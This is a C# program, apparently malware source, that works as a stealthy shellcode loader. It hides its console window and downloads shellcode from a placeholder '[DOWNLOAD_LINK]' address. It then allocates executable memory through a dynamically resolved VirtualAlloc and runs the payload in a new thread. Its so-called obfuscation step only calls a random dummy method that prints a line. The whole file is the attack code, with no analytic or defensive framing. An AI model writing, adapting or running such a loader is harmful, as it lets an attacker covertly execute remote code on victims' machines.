using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Reflection;

class Program
{
    static void Main(string[] args)
    {
        HideConsoleWindow();
        byte[] shellcode = DownloadShellcode("[DOWNLOAD_LINK]");
        IntPtr memory = AllocateMemory(shellcode.Length);
        CopyShellcodeToMemory(shellcode, memory);
        ExecuteShellcode(memory);
        ObfuscateExecution();
    }

    static void HideConsoleWindow()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
    }

    static byte[] DownloadShellcode(string url)
    {
        WebClient wc = new WebClient();
        return wc.DownloadData(url);
    }

    static IntPtr AllocateMemory(int size)
    {
        IntPtr kernel32 = LoadLibrary("kernel32.dll");
        IntPtr virtualAllocAddr = GetProcAddress(kernel32, "VirtualAlloc");
        VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(virtualAllocAddr, typeof(VirtualAllocDelegate));
        return virtualAlloc(IntPtr.Zero, (uint)size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
    }

    static void CopyShellcodeToMemory(byte[] shellcode, IntPtr memory)
    {
        Marshal.Copy(shellcode, 0, memory, shellcode.Length);
    }

    static void ExecuteShellcode(IntPtr memory)
    {
        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, memory, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
    }

    static void ObfuscateExecution()
    {
        MethodInfo[] methods = typeof(ObfuscationClass).GetMethods(BindingFlags.Public | BindingFlags.Static);
        Random rand = new Random();
        int index = rand.Next(methods.Length);
        methods[index].Invoke(null, null);
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LoadLibrary(string dllName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0;
    private const int SW_SHOW = 5;

    private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    [Flags]
    enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000
    }

    [Flags]
    enum MemoryProtection
    {
        ExecuteReadWrite = 0x40
    }
}

class ObfuscationClass
{
    public static void Obfuscate1()
    {
        Console.WriteLine("Obfuscate method 1 executed.");
    }

    public static void Obfuscate2()
    {
        Console.WriteLine("Obfuscate method 2 executed.");
    }

    public static void Obfuscate3()
    {
        Console.WriteLine("Obfuscate method 3 executed.");
    }
}
